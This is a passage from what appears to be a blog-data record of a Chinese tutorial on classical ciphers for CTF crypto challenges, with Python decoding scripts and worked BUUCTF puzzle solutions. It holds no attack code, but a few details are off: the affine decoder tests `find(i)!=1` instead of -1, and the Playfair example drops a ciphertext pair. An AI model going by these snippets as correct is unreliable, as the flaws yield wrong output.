print(a[s][count-1],end=\"\")\n\n第一步：\n\n**构造3个需要的值，变量和列表**\n\n**cipher就是题目附件的字符串**\n\n**base就是键盘上一行对应的数字，第一个为空。因为索引的时候，第一个为0。使得q正好为1**\n\n**a列表第一个的空格字符串同理。也是0。如下走下来空格对应九格键盘上的1，abc就对应九格键盘上的数字2，def对应3。**\n\n第二步：\n\nindex就是索引的值，就是取键盘上的数字\n\n![img](https://pic2.zhimg.com/80/v2-8370c8c5599d16c927c2a7216487abdd_720w.jpg)\n\n**a[][]。列表的两次，就直接取对应的字母了。end是为了不换行。**\n\n![img](https://pic3.zhimg.com/80/v2-24e40bf3a20626da1ee809fac0c5637e_720w.jpg)\n\n**count的减1，还是因为第一个是0**\n\n![img](https://pic4.zhimg.com/80/v2-e307810ec18c982899f092d77449e2f3_720w.jpg)\n\nBuuctf- Crypo-[MRCTF2020]keyboard\n\n得到的flag用\n\nMRCTF{xxxxxx}形式上叫\n\n都为小写字母\n\n6\n\n666\n\n22\n\n444\n\n555\n\n33\n\n7\n\n44\n\n666\n\n66\n\n3\n\n\n\n![img](https://pic1.zhimg.com/80/v2-857b995784eef5b15242292fdc9d57d4_720w.jpg)\n\n\n\n\n\nstr=\"6 666 22 444 555 33 7 44 666 66 3\"\n\na=[\" \",\" \",\"abc\",\"def\",\"ghi\",\"jkl\",\"mno\",\"pqrs\",\"tuv\",\"wxyz\"]\n\nfor i in str.split(\" \"):\n\n  s=int(i[0])\n\n  count=len(i)\n\n  print(a[s][count-1],end=\"\")\n\n**这边解出来最后一个字母是d。但提交不上。搜一下这个单词就知道最后一个应该打错了。是e**\n\n26键包含真题：\n\n实验吧-密码学-keyword\n\n![img](https://pic4.zhimg.com/80/v2-e070e8a0e26fa380290d53e7d2704093_720w.jpg)\n\n根据题目hint：应该。是键盘包围，或者画图\n\nBHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN\n\n空格划组 逗号也算一个里面\n\n直接画出来\n\n\n\nNBNCBNNBNBC\n\n## **栅栏密码：**\n\n栅栏密码是典型的置换密码。把明文分成n个1组。在进行连接。根据如何连接，又分为普通栅栏密码（|||栅栏密码）和W型栅栏密码。\n\n\n\n普通栅栏密码（|||栅栏密码）\n\n值和n：\n\nfslda1g2{3a}\n\nn=2\n\n\n\n按2个分组\n\nfs  ld  a1  g2  {3  a}\n\n\n\n取第一个\n\nflag{a\n\n\n\n在取全部\n\nflag{asd123}\n\n普通栅栏密码（|||栅栏密码）真题-one：\n\nBuuctf-Crypto-篱笆墙的影子\n\n直接两栏获得flag\n\n![img](https://pic1.zhimg.com/80/v2-ecb70e84f97468a9c5eed6923bc6a2f0_720w.jpg)\n\nw型栅栏密码\n\n写成W型的栅栏密码。但读取还是按行从左往右读取。\n\n值和n：\n\nflag{asd123}\n\nn=2\n\n\n\n照样是2个分组\n\nf.a.{.s.1.3\n\n.l.g.a.d.2.}\n\n\n\n直接从左往右读取\n\nfa{s13lgad2}\n\n\n\nW型栅栏密码真题-one：\n\n攻防世界Crypto新手-Railfence\n\n根据题目名和题目描述可知是栅栏密码。\n\n\n\n![img](https://pic4.zhimg.com/80/v2-bb5b130d16c4a1530b1a1d0403ee7e8f_720w.jpg)\n\n但不是普通的|||型栅栏密码\n\n是变种的W型栅栏密码\n\n### **在线解密：**\n\n[http://www.atoolbox.net/Tool.php?Id=777](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777)\n\n![img](https://pic3.zhimg.com/80/v2-090a754d2d59387491b0becd12bf1c92_720w.jpg)\n\n手解：\n\n把值按照W型进行横排排列，把明文的第一个填充到密文的第一行第1个位置，把明文的第二个填充到密文的第一行第9个位置。在把明文的第三个填充到密文的第17个位置。在把明文的第四个填充到密文的第25个位置。在把明文的第五个填充到密文的第33个位置。\n\n![img](https://pic1.zhimg.com/80/v2-bdccd3e6610deff7b3399f83385cd15c_720w.jpg)\n\n当len=35，key=5时（这个就自己画一画吧）然后你就会发现：首行和尾行的间隔依旧不变，假设行数为i，当当前数为第2行的奇数的时候，下一个数字为2+6=8也就是（key-i）*2,若当前数为第二行偶数的时候，下一个数字为8+2=10也就是(i-1)*2。\n\n![img](https://pic4.zhimg.com/80/v2-02d6283fe27ea56f8d866bd028d3189f_720w.jpg)\n\n#### 普通栅栏密码加解密：\n\n[https://www.qqxiuzi.cn/bianma/zhalanmima.php](https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/zhalanmima.php)\n\n#### W型栅栏密码在线加解密：\n\n[http://www.atoolbox.net/Tool.php?Id=777](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777)\n\n## **云影密码：**\n\n有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0=28， 也就是0=2+8，同理7=124，  9=18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”。\n\n也给出一个python脚本地址：\n\n[https://www.jianshu.com/p/b5aa5cf60f83](https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/b5aa5cf60f83)\n\n```text\n#!/usr/bin/python\n# -*- coding=utf8 -*-\n\"\"\"\n# @Author : pig\n# @CreatedTime:2019-11-2423:54:02\n# @Description : \n\"\"\"\n\n\ndef de_code(c):\n    dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)]\n    flag = []\n    c2 = [i for i in c.split(\"0\")]\n    for i in c2:\n        c3 = 0\n        for j in i:\n            c3 += int(j)\n        flag.append(dic[c3 - 1])\n    return flag\n\ndef encode(plaintext):\n    dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)]\n    m = [i for i in plaintext]\n    tmp = [];flag = []\n    for i in range(len(m)):\n        for j in range(len(dic)):\n            if m[i] == dic[j]:\n                tmp.append(j + 1)\n    for i in tmp:\n        res = \"\"\n        if i >= 8:\n            res += int(i/8)*\"8\"\n        if i%8 >=4:\n            res += int(i%8/4)*\"4\"\n        if i%4 >=2:\n            res += int(i%4/2)*\"2\"\n        if i%2 >= 1:\n            res += int(i%2/1)*\"1\"\n        flag.append(res + \"0\")\n    print (\"\".join(flag)[:-1])\n\nc = input(\"输入要解密的数字串:\")\nprint (de_code(c))\nm_code = input(\"请输入要加密的数字串:\")\nencode(m_code)\n```\n\n\n\n## **简单位移密码：**\n\n这个密码是我在《ctf特训营》这本书上看到的。自己并没有在题目中做到过\n\n实例借鉴书中\n\nm=flag{easy_easy_crypto}\n\nk=”3124”\n\n\n\nlen(k)=4，切分m。\n\nflay {eas y_ea sy_c rypt o}\n\n按照3124直接排列\n\nLafg ea{s _eya y_sc yprt }o\n\n\n\n密文：\n\nLafgea{s_eyay_scyprt}o\n\n\n\n解密代码：\n\n```text\ndef shift_decrypt(c,k):\n    l=len(k)\n    m=\"\"\n    for i in range(0,len(c),l):\n        tmp_m=[\"\"]*l\n        if i+l>=len(c):\n            tmp_c=c[i:]\n            use=[]\n            for kindex in range(len(tmp_c)):\n                use.append(int(k[kindex])-l)\n            use.sort()\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[use.index(int(k[kindex])-l)]\n        else:\n            tmp_c=c[i:i+l]\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[int(k[kindex])-1]\n        m+=\"\".join(tmp_m)\n    return m\nc=\"lafgea{s_eyay_scyprt}o\"\nk=\"3124\"\nprint shift_decrypt(c,k)\n```\n\n\n\n## **曲路密码：**\n\n按照事先约定的原则把明文填入表中\n\n例如：明文为HelloWorldab\n\n\n\n![img](https://pic3.zhimg.com/80/v2-c8e5bd0d1dfa3ececd04d2d2bd49863a_720w.jpg)\n\n\n\n按照一定的顺序进行遍历\n\n密文就是lrbaoleWdloH\n\n\n\n**CTF crypto线下工具推荐：**\n\n\n\n**CTFCrackTools**\n\n[https://github.com/Acmesec/CTFCrackTools](https://link.zhihu.com/?target=https%3A//github.com/Acmesec/CTFCrackTools)\n\n![img](https://pic4.zhimg.com/80/v2-1131910e2546d1455cf91261f8369e73_720w.jpg)\n\n**CyberChef**\n\n[https://www.chinabaiker.com/cyberchef.htm](https://link.zhihu.com/?target=https%3A//www.chinabaiker.com/cyberchef.htm)\n\n直接可以下载到本地\n\n![img](https://pic1.zhimg.com/80/v2-aa7579316f632a3a6351bb73f1bf9840_720w.jpg)\n\n\n\n**参考：**\n\n[https://ctf-wiki.github.io/ctf-wiki/crypto](https://link.zhihu.com/?target=https%3A//ctf-wiki.github.io/ctf-wiki/crypto)\n\n[https://zh.wikipedia.org/wiki](https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki)\n\n[https://baike.baidu.com](https://link.zhihu.com/?target=https%3A//baike.baidu.com)\n\n《ctf特训营》\n\n[https://buuoj.cn/](https://link.zhihu.com/?target=https%3A//buuoj.cn/)\n\n**相关实验：**\n\n相关实验：密码学原理\n\n[课程:密码学原理(合天网安实验室)](https://link.zhihu.com/?target=https%3A//sourl.cn/9cMsyV)\n\n（密码学是研究如何隐密地传递信息的学科。通过本课程实验掌握密码学的相关知识。）","source":"_posts/2020-10-01-古典密码从零到一.md","raw":"---\ntitle: 古典密码从0到1\ndate: 2020-10-02\ncategories: blog\ntags: [CTF,密码学]\ndescription: 白嫖的文章改的。\n---\n\n[toc]\n\n# 古典密码从0到1\n\n**![img](https://pic1.zhimg.com/80/v2-f483400333b7ccaa8689e9cfc0c3e8dc_720w.jpg)**\n\n## **古典密码和现代密码的区别：**\n\n古典密码是密码学中的其中一个类型，其大部分加密方式都是利用替换式密码或移项式密码，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是 A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。\n\n现代的方法是用电脑或是其它数字科技，基于比特和字节上操作。许多经典密码被受尊重的人使用，像是尤利乌斯·凯撒和拿破仑，他们创造了一些常被人们使用的密码。许多密码起源于军事上，相同立场的人常使用来寄送秘密消息。经典的方法常攻击密码文，有时候甚至不知其密码系统，也可以使用工具，像是频率分析法。有些经典密码是使用先进的机器或是机电密码机器，像是恩尼格玛密码机。                           ---维基\n\n其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：\n\n单表替换加密（Monoalphabetic Cipher）\n\n多表替换加密（Polyalphabetic Cipher）\n\n奇奇怪怪的加密方式                                             --ctf wiki\n\n\n\n## **凯撒密码：**\n\n​\t凯撒曾经使用这种密码与其将军们来联系，所以用凯撒来命名这种密码。\n\n根据图片来了解加密原理。凯撒密码一般适用于26个英文字母。根据偏移量来进行加密。如图所示，当偏移量=3。即是A-D,B-E。\n\n![img](https://pic2.zhimg.com/80/v2-ab311b6e604849f12c19e5e96818a925_720w.jpg)\n\n​\t把字母转成数学，数学公式如下。\n\n![img](https://pic1.zhimg.com/80/v2-f77f29985ee9014f3df11575682ac180_720w.jpg)\n\n### **在线加解密网站：**\n\n[https://www.qqxiuzi.cn/bianma/kaisamima.php](https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/kaisamima.php)\n\n[http://www.metools.info/code/c70.html](https://link.zhihu.com/?target=http%3A//www.metools.info/code/c70.html)\n\n[http://www.atoolbox.net/Tool.php?Id=778](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D778)\n\n## **仿射密码：**\n\n数学加密公式：\n\n![img](https://pic3.zhimg.com/80/v2-1a7aeab7e90203fc056e398344ce2b7a_720w.jpg)\n\n\n\n仿射密码中解密需要用到求逆元\n\n直接给出python解密脚本：\n\n```text\nimport primefac\ndef affine_decode(c,a,b,origin=\"abcdefghijklmnopqrstuvwxyz\"):\n    r=\"\"\n    n=len(origin)\n    ai=primefac.modinv(a,n)%n\n    for i in c:\n        if origin.find(i)!=1:\n            r+=origin[(ai*(origin.index(i)-b))%n]\n        else:\n            r+=i\n    return r\nprint affine_decode(\"ihhwvcswfrcp\",5,8)\n\ndef affine_guessab(m1,c1,m2,c2,origin=\"abcdefghijklmnopqrstuvwxyz\"):\n    x1=origin.index(m1)\n    x2=origin.index(m2)\n    y1=origin.index(c1)\n    y2=origin.index(c2)\n    n=len(origin)\n    dxi=primefac.modinv(x1-x2,n)%n\n    a=dxi*(y1-y2) % n\n    b=(y1-a*x1)%n\n    return a,b\nprint affine_guessab(\"a\",\"i\",\"f\",\"h\")\n```\n\n\n\n### 仿射密码在线加解密网站：\n\n[http://www.atoolbox.net/Tool.php?Id=911](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D911)\n\n##### 仿射密码真题-one：\n\nBuuctf- Crypto-[GKCTF2020]小学生的密码学\n\ne(x)=11x+6(mod26)\n\n密文：welcylk\n\n（flag为base64形式）\n\n\n\n![img](https://pic4.zhimg.com/80/v2-cf93192b800a57815bc7b5c050f8c673_720w.jpg)\n\n![img](https://pic2.zhimg.com/80/v2-b9d84b6e31edf9ebe9931c5174eba819_720w.jpg)\n\n\n\n## **四方密码：**\n\n四方密码是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。\n\n这种方法将字母两个一组，然后采用多字母替换密码。\n\n四方密码用4个5×5的矩阵来加密。每个矩阵都有25个字母（通常会取消Q或将I,J视作同一样，或改进为6×6的矩阵，加入10个数字）。\n\n\n\n选两个密钥，example和keyword。去掉重复的字母。就是example变成exampl。余下的字母顺序存入矩阵即可\n\n加密矩阵放右上和左下。\n\n![img](https://pic1.zhimg.com/80/v2-7f9734b21e0caee6689d77d9de7e1b6c_720w.jpg)\n\n加密步骤。把字符串按两个字母一组分开\n\nHelloworld\n\nHe ll ow or ld\n\n找第一组第一个字母在左上角矩阵的位置：\n\n![img](https://pic3.zhimg.com/80/v2-c210fedc80540995f608f795a073acda_720w.jpg)\n\n找第一组第二个字母在右下角矩阵的位置：\n\n![img](https://pic1.zhimg.com/80/v2-165d0ff7602b3b7801cd2e050cc948e0_720w.jpg)\n\n先找和一个字母同横的，和第二个字母同直的\n\n![img](https://pic1.zhimg.com/80/v2-9df900be2dee2b0602d420ff290a5adc_720w.jpg)\n\n第一个字母同直，第二个字母同横的\n\n![img](https://pic4.zhimg.com/80/v2-01dc7c7890019f58beef4ade3bd5eab7_720w.jpg)\n\n得到he加密后为FY\n\n如此可得接下来，最后就是\n\nhe lp me ob iw an ke no bi\n\nFY GM KY HO BX MF KK KI MD\n\n##### 四方密码真题-one：\n\nBuuctf-crypo-四面八方\n\n四方密码：\n\nwiki上了解四方密码如何加解密的一个过程\n\n[https://zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC](https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC)\n\n密钥存阵\n\n通常在题目中会给定2个密钥，我们要去掉Q或者把I和J当成一个。按照26个英文字母。秘钥中出现的不填。补充成5*5的矩阵\n\n![img](https://pic4.zhimg.com/80/v2-bf5760187447c0cdd17602207d2b8453_720w.jpg)\n\n这题直接填充即可\n\nsecurityabdfghjklmnopvwxz\n\nsecurityadbfghjklmnopvwxz\n\nabcdefghijklmnopqrstuvwxyz\n\n\n\ninformatn\n\ninformatbcdeghjklpsuvwxyz\n\nabcdefghijklmnopqrstuvwxyz\n\n### **在线解密工具：**\n\n[http://ctf.ssleye.com/four.html](https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html)\n\n根据题目说的解出来的语句是个通顺的句子，那肯定排序就有点问题\n\n![img](https://pic1.zhimg.com/80/v2-6dfcefe68d59545916e53be11cfebb3c_720w.jpg)\n\n**接下来可以拿出词频分析。**\n\n这边分割可以多试试。可以看出来个success，其他位置试\n\n**[https://quipqiup.com/](https://link.zhihu.com/?target=https%3A//quipqiup.com/)**\n\n![img](https://pic3.zhimg.com/80/v2-8a82b177919a7e61bcc1d84ff940acb2_720w.jpg)\n\n\n\n### 四方密码在线加解密网站：\n\n[http://ctf.ssleye.com/four.html](https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html)\n\n## **培根密码：**\n\n培根密码直接根据表中的字母进行转换。\n\n密文一般只含有a和b字母\n\n![img](https://pic1.zhimg.com/80/v2-9e23a167e68739049ecb21cdde085a98_720w.jpg)\n\n培根密码在线解密：\n\n[https://tool.bugku.com/peigen/](https://link.zhihu.com/?target=https%3A//tool.bugku.com/peigen/)\n\n培根密码真题-one：\n\n攻防世界crypto新手-不仅仅是morse\n\n![img](https://pic4.zhimg.com/80/v2-bc8cc8808aa0560f4811c4e0c2283a3f_720w.jpg)\n\n把/转换成空格。直接拿出morse解密\n\n![img](https://pic3.zhimg.com/80/v2-7712dc9ce03f0cbad6f2e3cf68b19062_720w.jpg)\n\n在看后面一段像培根密码，根据题目提示是食物加密。\n\n![img](https://pic2.zhimg.com/80/v2-8f60398906141bf4062ade9faa45787d_720w.jpg)\n\n\n\n## **标准银河字母：**\n\n标准银河字母（Standard Galactic Alphabet）出自游戏《指挥官基恩》系列。是系列中使用的书写系统。这是一个简单的替代暗号，用不同的符号取代拉丁字母。SGA可以在不同的语言中使用，比如在游戏《Minecraft》，《指挥官基恩》中。\n\n如果遇到这类题。直接根据题目来进行图翻->字母\n\n![img](https://pic3.zhimg.com/80/v2-ba0f6c12d8d4c71bc1f36c0faa472272_720w.jpg)\n\n## **圣堂武士密码：**\n\n圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种,一直被共济会圣殿骑士用。\n\n直接根据图片上的直接翻译出字母即可\n\n![img](https://pic1.zhimg.com/80/v2-1fbce927928b8189a662418fa9655394_720w.jpg)\n\n## **猪圈密码：**\n\n猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。\n\n直接图片替换字母即可\n\n![img](https://pic4.zhimg.com/80/v2-c20685d002fe2653944302a1c12a5327_720w.jpg)\n\n\n\n\n\n### **猪圈密码在线解密网站：**\n\n[http://www.metools.info/code/c90.html](https://link.zhihu.com/?target=http%3A//www.metools.info/code/c90.html)\n\n猪圈密码真题：\n\nBuuctf-crypto-萌萌哒的八戒\n\n![img](https://pic4.zhimg.com/80/v2-64cefda059f2f55f522ad0ca6e81f74f_720w.jpg)\n\n\n\n直接解密\n\n![img](https://pic4.zhimg.com/80/v2-87186735e3b7ee8e57ca015e5cecddd3_720w.jpg)\n\n\n\n猪圈密码-圣堂武士密码-标准银河字母-栅栏密码真题：\n\nBuuctf-Crypto- [MRCTF2020]古典密码知多少\n\n![img](https://pic4.zhimg.com/80/v2-52004a0174178967f87f54236b8d01bf_720w.jpg)\n\n![img](https://pic1.zhimg.com/80/v2-1b31253a3056562005cb5f6ac911ed30_720w.jpg)\n\n图上的蓝色就是猪圈密码，橙色的是圣堂武士密码，黑色的是银河字母。\n\n![img](https://pic3.zhimg.com/80/v2-61739e1b2e5a4eed51c7bf7abb7a3f26_720w.jpg)\n\n![img](https://pic2.zhimg.com/80/v2-c7a82d3ea6d815257627ee9273676061_720w.jpg)\n\n\n\n## **当铺密码：**\n\n当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：\n\n口 0\t田 0\t由 1\t中 2\t人 3\t工 4\n\n大 5\t王 6\t夫 7\t井 8\t羊 9\n\n具体映射可查看：\n\n[https://www.cnblogs.com/cc11001100/p/9357263.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/cc11001100/p/9357263.html)\n\n当铺密码真题：\n\nBuuctf-crypto-GKCTF2020汉字的秘密\n\n![img](https://pic2.zhimg.com/80/v2-9abe603c0eef1e0746f91ec04dc24aad_720w.jpg)\n\n![img](https://pic4.zhimg.com/80/v2-fb9478ec0839e5017f8cd83cef8bfbb7_720w.jpg)\n\n直接解码发现不对。\n\n![img](https://pic4.zhimg.com/80/v2-65054bc4d94d218e47c6b7229e799357_720w.jpg)\n\n翻看ascii码。改进一下脚本：\n\n自己猜一下flag开头为flag。可以看到ascii嘛每一位都是递增的。\n\n差为1,2,3,4\n\n![img](https://pic3.zhimg.com/80/v2-f2ccb7e18e9b325dc067e5d977740536_720w.jpg)\n\n## **跳舞的小人密码：**\n\n跳舞的人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。\n\n这题直接根据表来进行转换即可。加解密同\n\n![img](https://pic1.zhimg.com/80/v2-bfa0f0835ce4a7ec0dae25be5c3d40a4_720w.jpg)\n\n这题感觉是做过的。但没翻到例题。就不放了。\n\n## **希尔密码（hill）：**\n\n希尔密码（Hill Cipher）是运用基本矩阵论原理的替换密码，由Lester S. Hill在1929年发明。每个字母当作26进制数字：A=0, B=1, C=2... 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。\n\n直接给出网上的脚本可以参考：\n\n```text\nimport numpy as np\n\nm = 'YOURPINNOISFOURONETWOSIX'  #明文\na = np.matrix([[11,2,19],[5,23,25],[20,7,17]])  #密钥LCTFXZUHR\nnum_m = []\ntemp = []\ncount = 1\nfor i in m:  #将明文分为三个一组\n    temp.append(ord(i)-ord('A'))\n    if count % 3 == 0:\n        num_m.append(temp)\n        temp = []\n    count += 1\nmat_m = [np.matrix(i).T for i in num_m]  #将明文分组转换为向量形式\nmat_c = [a * i % 26 for i in mat_m]  #得到密文分组的向量形式\nnum_c = []\ntemp = []\nfor i in mat_c:  #将密文向量转换为列表形式，且合并到一个列表\n    temp = i.tolist()\n    for j in range(3):\n        num_c.append(temp[j][0])\nc = [chr(i+ord('A')) for i in num_c]\nprint(''.join(c))  #连接成字符串,输出密文\n```\n\n### **希尔密码在线加解密：**\n\n[http://www.atoolbox.net/Tool.php?Id=914](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D914)\n\n## **维吉尼亚密码：**\n\n维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。\n\n维吉尼亚加解密表格：\n\n![img](https://pic2.zhimg.com/80/v2-0256b1f8fe704260074c03e4b2696ef5_720w.jpg)\n\n当明文为\n\nATTACKATDAWN\n\n\n\n选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：\n\nLEMONLEMONLE\n\n\n\n对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：\n\n\n\n明文：ATTACKATDAWN\n\n密钥：LEMONLEMONLE\n\n密文：LXFOPVEFRNHR\n\n### **维吉尼亚密码在线加解密：**\n\n[https://www.qqxiuzi.cn/bianma/weijiniyamima.php](https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/weijiniyamima.php)\n\n\n\n维吉尼亚密码真题-one：\n\nBUUCTF-Crypto-[BJDCTF 2nd]燕言燕语-y1ng\n\n小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:\n\n79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20\n\n16进制转字符串\n\n![img](https://pic1.zhimg.com/80/v2-8a3764498e3bbb3b136a4ff59ac70ba0_720w.jpg)\n\n\n\n维吉尼亚在线直接解\n\n![img](https://pic3.zhimg.com/80/v2-2aa851be441a5f864a0b1306eac29392_720w.jpg)\n\n## **棋盘密码（Polybius）：**\n\n波利比奥斯棋盘（Polybius Checkerboard）是棋盘密码的一种，是利用波利比奥斯方阵(Polybius  Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。\n\n借鉴知乎上的图\n\n![img](https://pic3.zhimg.com/80/v2-095ef336986fd39db6580115c3a78792_720w.jpg)\n\n\n\n先看纵向，在看横向。得到密文\n\n明文HELLO 密文：23 15 31 31 34\n\n## **普莱费尔密码（playfair）：**\n\n选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将Q去除，或将I和J视作同一字。）\n\n将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。若剩下一个字，也加入X字。\n\n在每组中，找出两个字母在矩阵中的地方。\n\n若两个字母不在同一直行或同一横列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角。\n\n若两个字母在同一横列，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。\n\n若两个字母在同一直行，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。\n\n\n\n取playfair example为密钥。即可得到表\n\nP L A Y F\n\nI R E X M\n\nB C D G H\n\nK N O Q S\n\nT U V W Z\n\n需要加密的为Hide the gold\n\nHI DE TH EG OL\n\n加密后为\n\nBM OD ZB XD\n\n### **在线普莱费尔加解密：**\n\n[http://www.atoolbox.net/Tool.php?Id=912](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D912)\n\n[http://rumkin.com/tools/cipher/playfair.php](https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php)\n\n\n\n普莱费尔真题-one：\n\nBuuctf-crypto-cipher\n\n还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}\n\n[http://rumkin.com/tools/cipher/playfair.php](https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php)\n\n![img](https://pic2.zhimg.com/80/v2-2be2d0bcb297711754a46296432e8f3d_720w.jpg)\n\n## **Nihilist密码：**\n\nNihilist跟polybius密码差不多\n\n相同的先看纵向，在看横向。\n\n例如a=[2,3]=23\n\n![img](https://pic2.zhimg.com/80/v2-929026378b34e6fd342567e8adf92a2d_720w.jpg)\n\n## **Keyboard密码：**\n\nKeyboard密码在ctf中应该是分多种类型的。这里提两种。即9键表和26键包含\n\n9键表就是通过九键上多次字母来进行字母提取\n\n26键包含通过明文多个字符对应一个密文\n\n9键表真题：\n\n直接放两道题来理解\n\nBuuctf- Crypto-[NCTF2019]Keyboard\n\n![img](https://pic1.zhimg.com/80/v2-7ab75ce548f7ec78fb0dcc1c305d78b8_720w.jpg)\n\n\n\n分析第一个字符串，ooo，o在键盘上对应的是9，有3个o，表示第9个格子的第三个字母，就是y。那yyy就是指字母o\n\n![img](https://pic1.zhimg.com/80/v2-5579f6bceb2f7b7be87c13a30ae19628_720w.jpg)\n\ncipher=\"ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee\"\n\nbase=\" qwertyuiop\"\n\na=[\" \",\" \",\"abc\",\"def\",\"ghi\",\"jkl\",\"mno\",\"pqrs\",\"tuv\",\"wxyz\"]\n\n\\#print(base.index(\"q\"))\n\nfor part in cipher.split(\" \"):\n\n  s=base.index(part[0])\n\n  count=len(part)\n\n  \\#print(a[9][2],end=\"\")\n\n  print(a[s][count-1],end=\"\")\n\n第一步：\n\n**构造3个需要的值，变量和列表**\n\n**cipher就是题目附件的字符串**\n\n**base就是键盘上一行对应的数字，第一个为空。因为索引的时候，第一个为0。使得q正好为1**\n\n**a列表第一个的空格字符串同理。也是0。如下走下来空格对应九格键盘上的1，abc就对应九格键盘上的数字2，def对应3。**\n\n第二步：\n\nindex就是索引的值，就是取键盘上的数字\n\n![img](https://pic2.zhimg.com/80/v2-8370c8c5599d16c927c2a7216487abdd_720w.jpg)\n\n**a[][]。列表的两次，就直接取对应的字母了。end是为了不换行。**\n\n![img](https://pic3.zhimg.com/80/v2-24e40bf3a20626da1ee809fac0c5637e_720w.jpg)\n\n**count的减1，还是因为第一个是0**\n\n![img](https://pic4.zhimg.com/80/v2-e307810ec18c982899f092d77449e2f3_720w.jpg)\n\nBuuctf- Crypo-[MRCTF2020]keyboard\n\n得到的flag用\n\nMRCTF{xxxxxx}形式上叫\n\n都为小写字母\n\n6\n\n666\n\n22\n\n444\n\n555\n\n33\n\n7\n\n44\n\n666\n\n66\n\n3\n\n\n\n![img](https://pic1.zhimg.com/80/v2-857b995784eef5b15242292fdc9d57d4_720w.jpg)\n\n\n\n\n\nstr=\"6 666 22 444 555 33 7 44 666 66 3\"\n\na=[\" \",\" \",\"abc\",\"def\",\"ghi\",\"jkl\",\"mno\",\"pqrs\",\"tuv\",\"wxyz\"]\n\nfor i in str.split(\" \"):\n\n  s=int(i[0])\n\n  count=len(i)\n\n  print(a[s][count-1],end=\"\")\n\n**这边解出来最后一个字母是d。但提交不上。搜一下这个单词就知道最后一个应该打错了。是e**\n\n26键包含真题：\n\n实验吧-密码学-keyword\n\n![img](https://pic4.zhimg.com/80/v2-e070e8a0e26fa380290d53e7d2704093_720w.jpg)\n\n根据题目hint：应该。是键盘包围，或者画图\n\nBHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN\n\n空格划组 逗号也算一个里面\n\n直接画出来\n\n\n\nNBNCBNNBNBC\n\n## 